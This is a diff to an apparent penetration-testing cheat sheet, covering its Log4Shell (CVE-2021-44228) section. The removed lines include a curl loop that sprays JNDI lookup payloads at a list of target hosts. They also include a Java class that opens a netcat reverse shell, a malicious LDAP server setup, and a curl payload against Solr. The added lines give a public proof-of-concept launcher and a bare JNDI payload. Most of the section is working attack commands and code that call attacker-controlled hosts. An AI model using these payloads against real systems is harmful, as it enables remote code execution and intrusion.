@@ -4376,87 +4376,26 @@ Not vulnerable if the error message starts with `usage:`.
 
 #### CVE-2021-44228: Log4Shell RCE (0-day)
 
+> https://github.com/kozmer/log4j-shell-poc
+
+##### Pre-requisistes
+
+> https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html
+
 ```c
-cat targets.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "X-Api-Version: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "User-Agent: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}";done
+tar -xvf jdk-8u20-linux-x64.tar.gz
 ```
 
-##### Preparation
-
-> http://mirrors.rootpei.com/jdk/
-
-File: jdk-8u181-linux-x64.tar.gz
-
-##### Creating Library Folder
+##### Start the Listener
 
 ```c
-sudo mkdir /usr/lib/jvm
-cd /usr/lib/jvm
-sudo tar xzvf /usr/lib/jvm/jdk-8u181-linux-x64.tar.gz
-sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
-sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
-sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1
-sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
-sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
-sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws
+python poc.py --userip <LHOST> --webport <RPORT> --lport <LPORT>                                   
 ```
 
-##### Verify Version
+##### Execution
 
 ```c
-java -version
-```
-
-##### Get Exploit Framework
-
-```c
-git clone https://github.com/mbechler/marshalsec
-cd /opt/08_exploitation_tools/marshalsec/
-sudo apt-get install maven
-mvn clean package -DskipTests
-```
-
-##### Exploit.java
-
-```c
-public class Exploit {
-    static {
-        try {
-            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash <LHOST> <LPORT>");
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-}
-```
-
-##### Compiling Exploit.java
-
-```c
-javac Exploit.java -source 8 -target 8
-```
-
-##### Start Pyhton3 HTTP Server
-
-```c
-python3 -m http.server 80
-```
-
-##### Starting the malicious LDAP Server
-
-```c
-java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<LHOST>:80/#Exploit"
-```
-
-##### Start local netcat listener
-
-```c
-nc -lnvp 9001
-```
-
-##### Execute the Payload
-
-```c
-curl 'http://<RHOST>:8983/solr/admin/cores?foo=$\{jndi:ldap://<LHOST>:1389/Exploit\}'
+${jndi:ldap://<LHOST>:1389/foobar}
 ```
 
 #### CVE-2022-0847: Dirty Pipe LPE
